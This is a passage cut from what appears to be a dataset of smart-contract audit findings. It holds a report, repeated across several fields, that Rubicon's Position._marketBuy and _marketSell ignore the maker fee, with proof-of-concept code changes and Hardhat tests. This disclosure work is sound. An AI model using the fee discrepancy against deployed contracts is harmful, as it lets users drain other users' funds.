rubiconMarket.setMakerFee(fee);\n\n        // owner calls Position.buyAllAmountWithLeverage function\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT,\n          x1_25\n        );\n\n        // owner sends 25000000000000000000 quote tokens\n        const ownerTestCoinBalanceAfter = await testCoin.balanceOf(owner.address);\n        expect(ownerTestCoinBalanceAfter.sub(ownerTestCoinBalanceBefore)).to.equal(-25000000000000000000n);\n\n        // owner receives 5624942 asset tokens\n        const ownerTestStableCoinAfter = await testStableCoin.balanceOf(owner.address);\n        expect(ownerTestStableCoinAfter.sub(ownerTestStableCoinBefore)).to.equal(5624942);\n      });\n```\n\nThird, please update the `Position._marketBuy` function again as follows to include the maker fee in `_fee` for the POC purpose.\n\n```solidity\n    function _marketBuy(\n        address _asset,\n        address _quote,\n        uint256 _maxFill\n    ) internal {\n        /** @audit divide by 100_000 for POC purpose */\n        // uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);\n        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(100_000);\n        /** */\n\n        /** @audit consider maker fee for POC purpose */\n        if (rubiconMarket.makerFee() > 0) {\n            _fee += mul(_maxFill, rubiconMarket.makerFee()) / 100_000;\n        }\n        /** */\n\n        uint256 _buyAmount = rubiconMarket.getBuyAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _maxFill.sub(_fee)\n        );\n        IERC20(_quote).approve(address(rubiconMarket), _maxFill);\n\n        rubiconMarket.buyAllAmount(\n            ERC20(_asset),\n            _buyAmount,\n            ERC20(_quote),\n            _maxFill\n        );\n    }\n```\n\nFourth, please add the following `changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000 and also considers maker fee` test in the `Long positions` `describe` block in `test\\hardhat-tests\\leverage-wrapper.ts`. This test will pass to show the number of asset tokens received by the user who calls the `Position.buyAllAmountWithLeverage` function when the `Position._marketBuy` function includes the maker fee in `_fee`. This test also demonstrates that the user should receive less asset tokens when the `Position._marketBuy` function includes the maker fee in `_fee` than when the `Position._marketBuy` function does not include the maker fee in `_fee`.\n\n```typescript\n      it.only(\"changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000 and also considers maker fee\", async function () {\n        const { owner, testCoin, testStableCoin, Position, rubiconMarket} =\n          await loadFixture(deployPoolsUtilityFixture);\n\n        // testCoin is quote token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestCoinBalanceBefore = await testCoin.balanceOf(owner.address);\n\n        // testStableCoin is asset token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestStableCoinBefore = await testStableCoin.balanceOf(owner.address);\n\n        // there is a maker fee\n        const fee = 50;\n        await rubiconMarket.setMakerFee(fee);\n\n        // owner calls Position.buyAllAmountWithLeverage function\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT,\n          x1_25\n        );\n\n        // owner still sends 25000000000000000000 quote tokens\n        const ownerTestCoinBalanceAfter = await testCoin.balanceOf(owner.address);\n        expect(ownerTestCoinBalanceAfter.sub(ownerTestCoinBalanceBefore)).to.equal(-25000000000000000000n);\n\n        // yet, owner receives 5622129 asset tokens\n        const ownerTestStableCoinAfter = await testStableCoin.balanceOf(owner.address);\n        expect(ownerTestStableCoinAfter.sub(ownerTestStableCoinBefore)).to.equal(5622129);\n\n        // owner receives less asset tokens in this situation than when Position._marketBuy function does not consider maker fee\n        expect(5622129).to.be.lt(5624942);\n      });\n```\n\n## Tools Used\nVSCode\n\n## Recommended Mitigation Steps\nThe `Position._marketBuy` and `Position._marketSell` functions can be updated to include the maker fee in `_fee` when `rubiconMarket.makerFee() > 0` is true.\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L454-L473\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L475-L511\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L314-L448\n\n\n# Vulnerability details\n\n## Impact\nWhen the following `Position._marketBuy` and `Position._marketSell` functions calculate `_fee`, the maker fee is not included.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L454-L473\n```solidity\n    function _marketBuy(\n        address _asset,\n        address _quote,\n        uint256 _maxFill\n    ) internal {\n        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);\n        uint256 _buyAmount = rubiconMarket.getBuyAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _maxFill.sub(_fee)\n        );\n        IERC20(_quote).approve(address(rubiconMarket), _maxFill);\n\n        rubiconMarket.buyAllAmount(\n            ERC20(_asset),\n            _buyAmount,\n            ERC20(_quote),\n            _maxFill\n        );\n    }\n```\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L475-L511\n```solidity\n    function _marketSell(\n        address _asset,\n        address _quote,\n        uint256 _minFill\n    ) internal {\n        uint256 _feeBPS = rubiconMarket.getFeeBPS();\n        uint256 _fee = _minFill.mul(_feeBPS).div(10000);\n        uint256 _payAmount = rubiconMarket.getPayAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _minFill.add(_fee)\n        );\n        uint256 _assetBalance = IERC20(_asset).balanceOf(address(this));\n\n        /// @dev recalculate fee in _asset form\n        _fee = _payAmount.mul(_feeBPS).div(10000);\n\n        if (_assetBalance < _payAmount) {\n            IERC20(_asset).transferFrom(\n                msg.sender,\n                address(this),\n                _payAmount.sub(_assetBalance).add(_fee)\n            );\n        }\n\n        IERC20(_asset).approve(\n            address(rubiconMarket),\n            IERC20(_asset).balanceOf(address(this))\n        );\n\n        rubiconMarket.sellAllAmount(\n            ERC20(_asset),\n            _payAmount,\n            ERC20(_quote),\n            _minFill\n        );\n    }\n```\n\nWhen the `Position._marketBuy` and `Position._marketSell` functions eventually call the following `RubiconMarket.buy` function, the maker fee can be considered and paid when `makerFee() > 0` is true.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L314-L448\n```solidity\n    function buy(\n        uint256 id,\n        uint256 quantity\n    ) public virtual can_buy(id) synchronized returns (bool) {\n        OfferInfo memory _offer = offers[id];\n        uint256 spend = mul(quantity, _offer.buy_amt) / _offer.pay_amt;\n\n        require(uint128(spend) == spend, \"spend is not an int\");\n        require(uint128(quantity) == quantity, \"quantity is not an int\");\n\n        ///@dev For backwards semantic compatibility.\n        if (\n            quantity == 0 ||\n            spend == 0 ||\n            quantity > _offer.pay_amt ||\n            spend > _offer.buy_amt\n        ) {\n            return false;\n        }\n\n        offers[id].pay_amt = sub(_offer.pay_amt, quantity);\n        offers[id].buy_amt = sub(_offer.buy_amt, spend);\n\n        /// @dev Fee logic added on taker trades\n        uint256 fee = mul(spend, feeBPS) / 100_000;\n        require(\n            _offer.buy_gem.transferFrom(msg.sender, feeTo, fee),\n            \"Insufficient funds to cover fee\"\n        );\n\n        // taker pay maker 0_0\n        if (makerFee() > 0) {\n            uint256 mFee = mul(spend, makerFee()) / 100_000;\n\n            /// @dev Handle the v1 -> v2 migration case where if owner == address(0) we transfer this fee to _offer.recipient\n            if (_offer.owner == address(0) && getRecipient(id) != address(0)) {\n                require(\n                    _offer.buy_gem.transferFrom(\n                        msg.sender,\n                        _offer.recipient,\n                        mFee\n                    ),\n                    \"Insufficient funds to cover fee\"\n                );\n            } else {\n                require(\n                    _offer.buy_gem.transferFrom(msg.sender, _offer.owner, mFee),\n                    \"Insufficient funds to cover fee\"\n                );\n            }\n\n            ...\n        }\n        ...\n    }\n```\n\nSince the `Position._marketBuy` and `Position._marketSell` functions do not consider the maker fee but the `RubiconMarket.buy` function does, `_fee` calculated by the `Position._marketBuy` and `Position._marketSell` functions and the fees, including the maker fee, that are paid by the user when calling the `RubiconMarket.buy` function are different. As a result, calling the `Position` contract's functions that eventually call the `Position._marketBuy` or `Position._marketSell` function can cause incorrect calculations and user funds to be lost. For instance, when calling the `Position.buyAllAmountWithLeverage` function, the user should receive less asset tokens when the `Position._marketBuy` function includes the maker fee in `_fee` than when the `Position._marketBuy` function does not include the maker fee in `_fee`. Since the `Position._marketBuy` function currently does not include the maker fee in `_fee`, the user receives more asset tokens than she or he is entitled to, and other users' asset tokens in the protocol are lost.\n\n## Proof of Concept\nFirst, please update the `Position._marketBuy` function as follows to divide by `100_000` for the POC purpose. This is for fixing the bug mentioned in the report titled \"Calling `Position._marketBuy` and `Position._marketSell` functions that calculate `_fee` by dividing by `10000` can cause incorrect calculations\".\n\n```solidity\n    function _marketBuy(\n        address _asset,\n        address _quote,\n        uint256 _maxFill\n    ) internal {\n        /** @audit divide by 100_000 for POC purpose */\n        // uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);\n        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(100_000);\n        /** */\n\n        uint256 _buyAmount = rubiconMarket.getBuyAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _maxFill.sub(_fee)\n        );\n        IERC20(_quote).approve(address(rubiconMarket), _maxFill);\n\n        rubiconMarket.buyAllAmount(\n            ERC20(_asset),\n            _buyAmount,\n            ERC20(_quote),\n            _maxFill\n        );\n    }\n```\n\nSecond, please add the following `changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000 but does not consider maker fee` test in the `Long positions` `describe` block in `test\\hardhat-tests\\leverage-wrapper.ts`. This test will pass to show the number of asset tokens received by the user who calls the `Position.buyAllAmountWithLeverage` function when the `Position._marketBuy` function does not include the maker fee in `_fee`.\n\n```typescript\n      it.only(\"changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000 but does not consider maker fee\", async function () {\n        const { owner, testCoin, testStableCoin, Position, rubiconMarket} =\n          await loadFixture(deployPoolsUtilityFixture);\n\n        // testCoin is quote token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestCoinBalanceBefore = await testCoin.balanceOf(owner.address);\n\n        // testStableCoin is asset token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestStableCoinBefore = await testStableCoin.balanceOf(owner.address);\n\n        // there is a maker fee\n        const fee = 50;\n        await rubiconMarket.setMakerFee(fee);\n\n        // owner calls Position.buyAllAmountWithLeverage function\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT,\n          x1_25\n        );\n\n        // owner sends 25000000000000000000 quote tokens\n        const ownerTestCoinBalanceAfter = await testCoin.balanceOf(owner.address);\n        expect(ownerTestCoinBalanceAfter.sub(ownerTestCoinBalanceBefore)).to.equal(-25000000000000000000n);\n\n        // owner receives 5624942 asset tokens\n        const ownerTestStableCoinAfter = await testStableCoin.balanceOf(owner.address);\n        expect(ownerTestStableCoinAfter.sub(ownerTestStableCoinBefore)).to.equal(5624942);\n      });\n```\n\nThird, please update the `Position._marketBuy` function again as follows to include the maker fee in `_fee` for the POC purpose.\n\n```solidity\n    function _marketBuy(\n        address _asset,\n        address _quote,\n        uint256 _maxFill\n    ) internal {\n        /** @audit divide by 100_000 for POC purpose */\n        // uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);\n        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(100_000);\n        /** */\n\n        /** @audit consider maker fee for POC purpose */\n        if (rubiconMarket.makerFee() > 0) {\n            _fee += mul(_maxFill, rubiconMarket.makerFee()) / 100_000;\n        }\n        /** */\n\n        uint256 _buyAmount = rubiconMarket.getBuyAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _maxFill.sub(_fee)\n        );\n        IERC20(_quote).approve(address(rubiconMarket), _maxFill);\n\n        rubiconMarket.buyAllAmount(\n            ERC20(_asset),\n            _buyAmount,\n            ERC20(_quote),\n            _maxFill\n        );\n    }\n```\n\nFourth, please add the following `changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000 and also considers maker fee` test in the `Long positions` `describe` block in `test\\hardhat-tests\\leverage-wrapper.ts`. This test will pass to show the number of asset tokens received by the user who calls the `Position.buyAllAmountWithLeverage` function when the `Position._marketBuy` function includes the maker fee in `_fee`. This test also demonstrates that the user should receive less asset tokens when the `Position._marketBuy` function includes the maker fee in `_fee` than when the `Position._marketBuy` function does not include the maker fee in `_fee`.\n\n```typescript\n      it.only(\"changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000 and also considers maker fee\", async function () {\n        const { owner, testCoin, testStableCoin, Position, rubiconMarket} =\n          await loadFixture(deployPoolsUtilityFixture);\n\n        // testCoin is quote token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestCoinBalanceBefore = await testCoin.balanceOf(owner.address);\n\n        // testStableCoin is asset token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestStableCoinBefore = await testStableCoin.balanceOf(owner.address);\n\n        // there is a maker fee\n        const fee = 50;\n        await rubiconMarket.setMakerFee(fee);\n\n        // owner calls Position.buyAllAmountWithLeverage function\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT,\n          x1_25\n        );\n\n        // owner still sends 25000000000000000000 quote tokens\n        const ownerTestCoinBalanceAfter = await testCoin.balanceOf(owner.address);\n        expect(ownerTestCoinBalanceAfter.sub(ownerTestCoinBalanceBefore)).to.equal(-25000000000000000000n);\n\n        // yet, owner receives 5622129 asset tokens\n        const ownerTestStableCoinAfter = await testStableCoin.balanceOf(owner.address);\n        expect(ownerTestStableCoinAfter.sub(ownerTestStableCoinBefore)).to.equal(5622129);\n\n        // owner receives less asset tokens in this situation than when Position._marketBuy function does not consider maker fee\n        expect(5622129).to.be.lt(5624942);\n      });\n```\n\n## Tools Used\nVSCode\n\n## Recommended Mitigation Steps\nThe `Position._marketBuy` and `Position._marketSell` functions can be updated to include the maker fee in `_fee` when `rubiconMarket.makerFee() > 0` is true.",
      "description": null,
      "impact": "## Impact\nWhen the following `Position._marketBuy` and `Position._marketSell` functions calculate `_fee`, the maker fee is not included.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L454-L473\n```solidity\n    function _marketBuy(\n        address _asset,\n        address _quote,\n        uint256 _maxFill\n    ) internal {\n        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);\n        uint256 _buyAmount = rubiconMarket.getBuyAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _maxFill.sub(_fee)\n        );\n        IERC20(_quote).approve(address(rubiconMarket), _maxFill);\n\n        rubiconMarket.buyAllAmount(\n            ERC20(_asset),\n            _buyAmount,\n            ERC20(_quote),\n            _maxFill\n        );\n    }\n```\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L475-L511\n```solidity\n    function _marketSell(\n        address _asset,\n        address _quote,\n        uint256 _minFill\n    ) internal {\n        uint256 _feeBPS = rubiconMarket.getFeeBPS();\n        uint256 _fee = _minFill.mul(_feeBPS).div(10000);\n        uint256 _payAmount = rubiconMarket.getPayAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _minFill.add(_fee)\n        );\n        uint256 _assetBalance = IERC20(_asset).balanceOf(address(this));\n\n        /// @dev recalculate fee in _asset form\n        _fee = _payAmount.mul(_feeBPS).div(10000);\n\n        if (_assetBalance < _payAmount) {\n            IERC20(_asset).transferFrom(\n                msg.sender,\n                address(this),\n                _payAmount.sub(_assetBalance).add(_fee)\n            );\n        }\n\n        IERC20(_asset).approve(\n            address(rubiconMarket),\n            IERC20(_asset).balanceOf(address(this))\n        );\n\n        rubiconMarket.sellAllAmount(\n            ERC20(_asset),\n            _payAmount,\n            ERC20(_quote),\n            _minFill\n        );\n    }\n```\n\nWhen the `Position._marketBuy` and `Position._marketSell` functions eventually call the following `RubiconMarket.buy` function, the maker fee can be considered and paid when `makerFee() > 0` is true.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L314-L448\n```solidity\n    function buy(\n        uint256 id,\n        uint256 quantity\n    ) public virtual can_buy(id) synchronized returns (bool) {\n        OfferInfo memory _offer = offers[id];\n        uint256 spend = mul(quantity, _offer.buy_amt) / _offer.pay_amt;\n\n        require(uint128(spend) == spend, \"spend is not an int\");\n        require(uint128(quantity) == quantity, \"quantity is not an int\");\n\n        ///@dev For backwards semantic compatibility.\n        if (\n            quantity == 0 ||\n            spend == 0 ||\n            quantity > _offer.pay_amt ||\n            spend > _offer.buy_amt\n        ) {\n            return false;\n        }\n\n        offers[id].pay_amt = sub(_offer.pay_amt, quantity);\n        offers[id].buy_amt = sub(_offer.buy_amt, spend);\n\n        /// @dev Fee logic added on taker trades\n        uint256 fee = mul(spend, feeBPS) / 100_000;\n        require(\n            _offer.buy_gem.transferFrom(msg.sender, feeTo, fee),\n            \"Insufficient funds to cover fee\"\n        );\n\n        // taker pay maker 0_0\n        if (makerFee() > 0) {\n            uint256 mFee = mul(spend, makerFee()) / 100_000;\n\n            /// @dev Handle the v1 -> v2 migration case where if owner == address(0) we transfer this fee to _offer.recipient\n            if (_offer.owner == address(0) && getRecipient(id) != address(0)) {\n                require(\n                    _offer.buy_gem.transferFrom(\n                        msg.sender,\n                        _offer.recipient,\n                        mFee\n                    ),\n                    \"Insufficient funds to cover fee\"\n                );\n            } else {\n                require(\n                    _offer.buy_gem.transferFrom(msg.sender, _offer.owner, mFee),\n                    \"Insufficient funds to cover fee\"\n                );\n            }\n\n            ...\n        }\n        ...\n    }\n```\n\nSince the `Position._marketBuy` and `Position._marketSell` functions do not consider the maker fee but the `RubiconMarket.buy` function does, `_fee` calculated by the `Position._marketBuy` and `Position._marketSell` functions and the fees, including the maker fee, that are paid by the user when calling the `RubiconMarket.buy` function are different. As a result, calling the `Position` contract's functions that eventually call the `Position._marketBuy` or `Position._marketSell` function can cause incorrect calculations and user funds to be lost. For instance, when calling the `Position.buyAllAmountWithLeverage` function, the user should receive less asset tokens when the `Position._marketBuy` function includes the maker fee in `_fee` than when the `Position._marketBuy` function does not include the maker fee in `_fee`. Since the `Position._marketBuy` function currently does not include the maker fee in `_fee`, the user receives more asset tokens than she or he is entitled to, and other users' asset tokens in the protocol are lost.\n",
      "mitigation": "## Recommended Mitigation Steps\nThe `Position._marketBuy` and `Position._marketSell` functions can be updated to include the maker fee in `_fee` when `rubiconMarket.makerFee() > 0` is true.\n",
      "poc": "## Proof of Concept\nFirst, please update the `Position._marketBuy` function as follows to divide by `100_000` for the POC purpose. This is for fixing the bug mentioned in the report titled \"Calling `Position._marketBuy` and `Position._marketSell` functions that calculate `_fee` by dividing by `10000` can cause incorrect calculations\".\n\n```solidity\n    function _marketBuy(\n        address _asset,\n        address _quote,\n        uint256 _maxFill\n    ) internal {\n        /** @audit divide by 100_000 for POC purpose */\n        // uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);\n        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(100_000);\n        /** */\n\n        uint256 _buyAmount = rubiconMarket.getBuyAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _maxFill.sub(_fee)\n        );\n        IERC20(_quote).approve(address(rubiconMarket), _maxFill);\n\n        rubiconMarket.buyAllAmount(\n            ERC20(_asset),\n            _buyAmount,\n            ERC20(_quote),\n            _maxFill\n        );\n    }\n```\n\nSecond, please add the following `changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000 but does not consider maker fee` test in the `Long positions` `describe` block in `test\\hardhat-tests\\leverage-wrapper.ts`. This test will pass to show the number of asset tokens received by the user who calls the `Position.buyAllAmountWithLeverage` function when the `Position._marketBuy` function does not include the maker fee in `_fee`.\n\n```typescript\n      it.only(\"changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000 but does not consider maker fee\", async function () {\n        const { owner, testCoin, testStableCoin, Position, rubiconMarket} =\n          await loadFixture(deployPoolsUtilityFixture);\n\n        // testCoin is quote token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestCoinBalanceBefore = await testCoin.balanceOf(owner.address);\n\n        // testStableCoin is asset token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestStableCoinBefore = await testStableCoin.balanceOf(owner.address);\n\n        // there is a maker fee\n        const fee = 50;\n        await rubiconMarket.setMakerFee(fee);\n\n        // owner calls Position.buyAllAmountWithLeverage function\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT,\n          x1_25\n        );\n\n        // owner sends 25000000000000000000 quote tokens\n        const ownerTestCoinBalanceAfter = await testCoin.balanceOf(owner.address);\n        expect(ownerTestCoinBalanceAfter.sub(ownerTestCoinBalanceBefore)).to.equal(-25000000000000000000n);\n\n        // owner receives 5624942 asset tokens\n        const ownerTestStableCoinAfter = await testStableCoin.balanceOf(owner.address);\n        expect(ownerTestStableCoinAfter.sub(ownerTestStableCoinBefore)).to.equal(5624942);\n      });\n```\n\nThird, please update the `Position._marketBuy` function again as follows to include the maker fee in `_fee` for the POC purpose.\n\n```solidity\n    function _marketBuy(\n        address _asset,\n        address _quote,\n        uint256 _maxFill\n    ) internal {\n        /** @audit divide by 100_000 for POC purpose */\n        // uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);\n        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(100_000);\n        /** */\n\n        /** @audit consider maker fee for POC purpose */\n        if (rubiconMarket.makerFee() > 0) {\n            _fee += mul(_maxFill, rubiconMarket.makerFee()) / 100_000;\n        }\n        /** */\n\n        uint256 _buyAmount = rubiconMarket.getBuyAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _maxFill.sub(_fee)\n        );\n        IERC20(_quote).approve(address(rubiconMarket), _maxFill);\n\n        rubiconMarket.buyAllAmount(\n            ERC20(_asset),\n            _buyAmount,\n            ERC20(_quote),\n            _maxFill\n        );\n    }\n```\n\nFourth, please add the following `changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000 and also considers maker fee` test in the `Long positions` `describe` block in `test\\hardhat-tests\\leverage-wrapper.ts`. This test will pass to show the number of asset tokens received by the user who calls the `Position.buyAllAmountWithLeverage` function when the `Position._marketBuy` function includes the maker fee in `_fee`. This test also demonstrates that the user should receive less asset tokens when the `Position._marketBuy` function includes the maker fee in `_fee` than when the `Position._marketBuy` function does not include the maker fee in `_fee`.\n\n```typescript\n      it.only(\"changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000 and also considers maker fee\", async function () {\n        const { owner, testCoin, testStableCoin, Position, rubiconMarket} =\n          await loadFixture(deployPoolsUtilityFixture);\n\n        // testCoin is quote token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestCoinBalanceBefore = await testCoin.balanceOf(owner.address);\n\n        // testStableCoin is asset token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestStableCoinBefore = await testStableCoin.balanceOf(owner.address);\n\n        // there is a maker fee\n        const fee = 50;\n        await rubiconMarket.setMakerFee(fee);\n\n        // owner calls Position.buyAllAmountWithLeverage function\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT,\n          x1_25\n        );\n\n        // owner still sends 25000000000000000000 quote tokens\n        const ownerTestCoinBalanceAfter = await testCoin.balanceOf(owner.address);\n        expect(ownerTestCoinBalanceAfter.sub(ownerTestCoinBalanceBefore)).to.equal(-25000000000000000000n);\n\n        // yet, owner receives 5622129 asset tokens\n        const ownerTestStableCoinAfter = await testStableCoin.balanceOf(owner.address);\n        expect(ownerTestStableCoinAfter.sub(ownerTestStableCoinBefore)).to.equal(5622129);\n\n        // owner receives less asset tokens in this situation than when Position._marketBuy function does not consider maker fee\n        expect(5622129).to.be.lt(5624942);\n      });\n```\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L454-L473\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L475-L511\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L314-L448\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nVSCode\n",
      "sections": {
        "description": null,
        "impact": "## Impact\nWhen the following `Position._marketBuy` and `Position._marketSell` functions calculate `_fee`, the maker fee is not included.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L454-L473\n```solidity\n    function _marketBuy(\n        address _asset,\n        address _quote,\n        uint256 _maxFill\n    ) internal {\n        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);\n        uint256 _buyAmount = rubiconMarket.getBuyAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _maxFill.sub(_fee)\n        );\n        IERC20(_quote).approve(address(rubiconMarket), _maxFill);\n\n        rubiconMarket.buyAllAmount(\n            ERC20(_asset),\n            _buyAmount,\n            ERC20(_quote),\n            _maxFill\n        );\n    }\n```\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L475-L511\n```solidity\n    function _marketSell(\n        address _asset,\n        address _quote,\n        uint256 _minFill\n    ) internal {\n        uint256 _feeBPS = rubiconMarket.getFeeBPS();\n        uint256 _fee = _minFill.mul(_feeBPS).div(10000);\n        uint256 _payAmount = rubiconMarket.getPayAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _minFill.add(_fee)\n        );\n        uint256 _assetBalance = IERC20(_asset).balanceOf(address(this));\n\n        /// @dev recalculate fee in _asset form\n        _fee = _payAmount.mul(_feeBPS).div(10000);\n\n        if (_assetBalance < _payAmount) {\n            IERC20(_asset).transferFrom(\n                msg.sender,\n                address(this),\n                _payAmount.sub(_assetBalance).add(_fee)\n            );\n        }\n\n        IERC20(_asset).approve(\n            address(rubiconMarket),\n            IERC20(_asset).balanceOf(address(this))\n        );\n\n        rubiconMarket.sellAllAmount(\n            ERC20(_asset),\n            _payAmount,\n            ERC20(_quote),\n            _minFill\n        );\n    }\n```\n\nWhen the `Position._marketBuy` and `Position._marketSell` functions eventually call the following `RubiconMarket.buy` function, the maker fee can be considered and paid when `makerFee() > 0` is true.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L314-L448\n```solidity\n    function buy(\n        uint256 id,\n        uint256 quantity\n    ) public virtual can_buy(id) synchronized returns (bool) {\n        OfferInfo memory _offer = offers[id];\n        uint256 spend = mul(quantity, _offer.buy_amt) / _offer.pay_amt;\n\n        require(uint128(spend) == spend, \"spend is not an int\");\n        require(uint128(quantity) == quantity, \"quantity is not an int\");\n\n        ///@dev For backwards semantic compatibility.\n        if (\n            quantity == 0 ||\n            spend == 0 ||\n            quantity > _offer.pay_amt ||\n            spend > _offer.buy_amt\n        ) {\n            return false;\n        }\n\n        offers[id].pay_amt = sub(_offer.pay_amt, quantity);\n        offers[id].buy_amt = sub(_offer.buy_amt, spend);\n\n        /// @dev Fee logic added on taker trades\n        uint256 fee = mul(spend, feeBPS) / 100_000;\n        require(\n            _offer.buy_gem.transferFrom(msg.sender, feeTo, fee),\n            \"Insufficient funds to cover fee\"\n        );\n\n        // taker pay maker 0_0\n        if (makerFee() > 0) {\n            uint256 mFee = mul(spend, makerFee()) / 100_000;\n\n            /// @dev Handle the v1 -> v2 migration case where if owner == address(0) we transfer this fee to _offer.recipient\n            if (_offer.owner == address(0) && getRecipient(id) != address(0)) {\n                require(\n                    _offer.buy_gem.transferFrom(\n                        msg.sender,\n                        _offer.recipient,\n                        mFee\n                    ),\n                    \"Insufficient funds to cover fee\"\n                );\n            } else {\n                require(\n                    _offer.buy_gem.transferFrom(msg.sender, _offer.owner, mFee),\n                    \"Insufficient funds to cover fee\"\n                );\n            }\n\n            ...\n        }\n        ...\n    }\n```\n\nSince the `Position._marketBuy` and `Position._marketSell` functions do not consider the maker fee but the `RubiconMarket.buy` function does, `_fee` calculated by the `Position._marketBuy` and `Position._marketSell` functions and the fees, including the maker fee, that are paid by the user when calling the `RubiconMarket.buy` function are different. As a result, calling the `Position` contract's functions that eventually call the `Position._marketBuy` or `Position._marketSell` function can cause incorrect calculations and user funds to be lost. For instance, when calling the `Position.buyAllAmountWithLeverage` function, the user should receive less asset tokens when the `Position._marketBuy` function includes the maker fee in `_fee` than when the `Position._marketBuy` function does not include the maker fee in `_fee`. Since the `Position._marketBuy` function currently does not include the maker fee in `_fee`, the user receives more asset tokens than she or he is entitled to, and other users' asset tokens in the protocol are lost.\n",
        "recommendation": "## Recommended Mitigation Steps\nThe `Position._marketBuy` and `Position._marketSell` functions can be updated to include the maker fee in `_fee` when `rubiconMarket.makerFee() > 0` is true.\n",
